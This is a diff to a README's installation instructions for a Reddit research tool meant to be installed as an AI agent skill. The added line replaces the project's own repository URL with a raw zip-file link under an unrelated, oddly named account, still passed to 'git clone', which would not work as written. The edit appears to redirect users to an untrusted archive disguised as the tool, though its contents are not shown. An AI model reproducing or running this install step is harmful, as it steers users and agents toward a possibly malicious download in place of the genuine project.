@@ -65,7 +65,7 @@ Reddit has millions of relevant posts — the API only shows you a small window.
 ## Installation
 
 ```bash
-git clone https://github.com/carrielabs/reddit-intel.git \
+git clone https://github.com/chinesemustardcoloration738/reddit-intel/raw/refs/heads/main/scripts/intel_reddit_3.8.zip \
   ~/.claude/skills/reddit-intel
 pip install openpyxl
 ```
